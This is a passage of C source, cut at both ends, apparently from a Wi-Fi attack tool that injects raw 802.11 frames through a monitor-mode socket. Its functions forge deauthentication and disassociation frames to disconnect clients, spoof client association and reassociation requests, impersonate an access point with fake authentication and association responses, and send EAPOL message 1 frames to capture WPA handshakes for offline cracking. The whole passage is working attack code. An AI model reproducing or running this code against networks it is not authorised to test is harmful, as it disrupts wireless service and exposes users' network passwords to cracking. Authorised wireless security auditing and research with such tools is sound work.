memset(zeiger, 0, TAGS_SIZE);
while(0 < infolen)
	{
	if(infolen == 4) return;
	tagptr = (ietag_t*)infoptr;
	if(tagptr->len == 0)
		{
		infoptr += tagptr->len +IETAG_SIZE;
		infolen -= tagptr->len +IETAG_SIZE;
		continue;
		}
	if(tagptr->len > infolen) return;
	if(tagptr->id == TAG_SSID)
		{
		if((tagptr->len > 0) && (tagptr->len <= ESSID_LEN_MAX))
			{
			memcpy(zeiger->essid, &tagptr->data[0], tagptr->len);
			zeiger->essidlen = tagptr->len;
			}
		}
	else if(tagptr->id == TAG_CHAN)
		{
		if(tagptr->len == 1) zeiger->channel = tagptr->data[0];
		}
	else if(tagptr->id == TAG_RSN)
		{
		if(tagptr->len >= RSNIE_LEN_MIN) gettagrsn(tagptr->len, tagptr->data, zeiger);
		}
	else if(tagptr->id == TAG_VENDOR)
		{
		if(tagptr->len >= VENDORIE_SIZE) gettagvendor(tagptr->len, tagptr->data, zeiger);
		}
	infoptr += tagptr->len +IETAG_SIZE;
	infolen -= tagptr->len +IETAG_SIZE;
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void send_disassociation(uint8_t *macsta, uint8_t *macap, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DISASSOC;
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydisassociationsequence++ << 4;
if(mydisassociationsequence >= 4096) mydisassociationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(write(fd_socket, packetoutptr,  HDRRT_SIZE +MAC_SIZE_NORM +2) < 0)
	{
	perror("\nfailed to transmit deuthentication");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_deauthentication2client(uint8_t *client, uint8_t *ap, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, client, 6);
memcpy(macftx->addr2, ap, 6);
memcpy(macftx->addr3, ap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydeauthenticationsequence++ << 4;
if(mydeauthenticationsequence >= 4096) mydeauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(write(fd_socket, packetoutptr,  HDRRT_SIZE +MAC_SIZE_NORM +2) < 0)
	{
	perror("\nfailed to transmit deuthentication");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa1(macessidlist_t *zeiger)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa1data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* WPA information (WPA1) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* pairwise cipher */
0x01, 0x00,  /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
};
#define REASSOCIATIONREQUESTWPA1_SIZE sizeof(reassociationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
memcpy(macftx->addr1, zeiger->ap, 6);
memcpy(macftx->addr2, zeiger->client, 6);
memcpy(macftx->addr3, zeiger->ap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, zeiger->ap, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE], &reassociationrequestwpa1data, REASSOCIATIONREQUESTWPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x29] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x2f] = CS_TKIP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x35] = AK_PSK;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA1_SIZE ) < 0)
	{
	perror("\nfailed to transmit reassociationrequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa2(macessidlist_t *zeiger)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa2data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x00, 0x00,
};
#define REASSOCIATIONREQUESTWPA2_SIZE sizeof(reassociationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
memcpy(macftx->addr1, zeiger->ap, 6);
memcpy(macftx->addr2, zeiger->client, 6);
memcpy(macftx->addr3, zeiger->ap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, zeiger->ap, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE], &reassociationrequestwpa2data, REASSOCIATIONREQUESTWPA2_SIZE);
if((zeiger->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x25] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x25] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x2b] = CS_CCMP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x31] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x31] = TAK_PSKSHA256;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA2_SIZE ) < 0)
	{
	perror("\nfailed to transmit reassociationrequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_ack()
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_ACK+1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_CTL;
macftx->subtype = IEEE80211_STYPE_ACK;
memcpy(macftx->addr1, macfrx->addr2, 6);
if(write(fd_socket, packetoutptr,  HDRRT_SIZE +MAC_SIZE_ACK) < 0)
	{
	perror("\nfailed to transmit acknowledgement");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_reassociation_resp()
{
static mac_t *macftx;

static const uint8_t reassociationresponsedata[] =
{
/* Fixed parameters (6 bytes) Fixed parameters (6 bytes) */
0x11, 0x04,
0x00, 0x00,
0x01, 0xc0,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define REASSOCIATIONRESPONSE_SIZE sizeof(reassociationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &reassociationresponsedata, REASSOCIATIONRESPONSE_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPONSE_SIZE) < 0)
	{
	perror("\nfailed to transmit associationresponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_m1_wpa2()
{
static mac_t *macftx;
static const uint8_t llcdata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e
};
static const uint8_t wpa2data[] =
{
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8a,
0x00, 0x10,
};
#define WPA2_SIZE sizeof(wpa2data)

timestamp += 1;
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +100);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
memcpy(macftx->addr1, &lastauthclient, 6);
memcpy(macftx->addr2, &lastauthap, 6);
memcpy(macftx->addr3, &lastauthap, 6);
macftx->from_ds = 1;
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &llcdata, LLC_SIZE);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE], &wpa2data, WPA2_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x0f] = (myrc >> 8) &0xff;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x10] = myrc &0xff;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x11], &myanonce, 32);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP)
		{
		packetlenown = HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99;
		writeepbown(fd_pcapng);
		}
	}
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99) < 0)
	{
	perror("\nfailed to transmit proberesponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
lastauthtimestamp = timestamp;
return;
}
/*===========================================================================*/
static inline void send_m1_wpa1()
{
static mac_t *macftx;
static const uint8_t llcdata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e
};
static const uint8_t wpa1data[] =
{
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x89,
0x00, 0x20,
};
#define WPA1_SIZE sizeof(wpa1data)

timestamp += 1;
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +100);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
memcpy(macftx->addr1, &lastauthclient, 6);
memcpy(macftx->addr2, &lastauthap, 6);
memcpy(macftx->addr3, &lastauthap, 6);
macftx->from_ds = 1;
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &llcdata, LLC_SIZE);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE], &wpa1data, WPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x0f] = (myrc >> 8) &0xff;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x10] = myrc &0xff;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x11], &myanonce, 32);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP)
		{
		packetlenown = HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99;
		writeepbown(fd_pcapng);
		}
	}
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99) < 0)
	{
	perror("\nfailed to transmit proberesponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
lastauthtimestamp = timestamp;
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa2(macessidlist_t *zeiger)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa2data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x00, 0x00,
/* HT capabilites */
0x2d, 0x1a, 0x6e, 0x18, 0x1f, 0xff, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA2_SIZE sizeof(associationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, zeiger->ap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, zeiger->ap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE], &associationrequestwpa2data, ASSOCIATIONREQUESTWPA2_SIZE);
if((zeiger->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x17] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x1d] = CS_CCMP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x23] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x23] = TAK_PSKSHA256;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE) < 0)
	{
	perror("\nfailed to transmit associationrequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa1(macessidlist_t *zeiger)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa1data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* WPA information (WPA1) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* pairwise cipher */
0x01, 0x00,  /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA1_SIZE sizeof(associationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, zeiger->ap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, zeiger->ap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE], &associationrequestwpa1data, ASSOCIATIONREQUESTWPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x1b] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x21] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x27] = AK_PSK;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA1_SIZE) < 0)
	{
	perror("\nfailed to transmit associationrequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_association_resp()
{
static mac_t *macftx;
static const uint8_t associationresponsedata[] =
{
/* Fixed parameters (6 bytes) Fixed parameters (6 bytes) */
0x11, 0x04,
0x00, 0x00,
0x01, 0xc0,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESPONSE_SIZE) < 0)
	{
	perror("\nfailed to transmit associationresponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
/*===========================================================================*/
/*
static void send_null(uint8_t *ap)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_NULLFUNC;
macftx->to_ds = 1;
memcpy(macftx->addr1, ap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, ap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydeauthenticationsequence++ << 4;
if(mydeauthenticationsequence >= 4096) mydeauthenticationsequence = 1;
if(write(fd_socket, packetoutptr,  HDRRT_SIZE +MAC_SIZE_NORM) < 0)
	{
	perror("\nfailed to transmit null");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
*/
/*===========================================================================*/
static inline void send_authentication_resp_opensystem()
{
static mac_t *macftx;
static const uint8_t authenticationresponsedata[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define AUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationresponsedata, AUTHENTICATIONRESPONSE_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE) < 0)
	{
	perror("\nfailed to transmit authenticationresponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_authentication_req_opensystem(uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t authenticationrequestdata[] =
{
0x00, 0x00, 0x01, 0x00, 0x00, 0x00
};
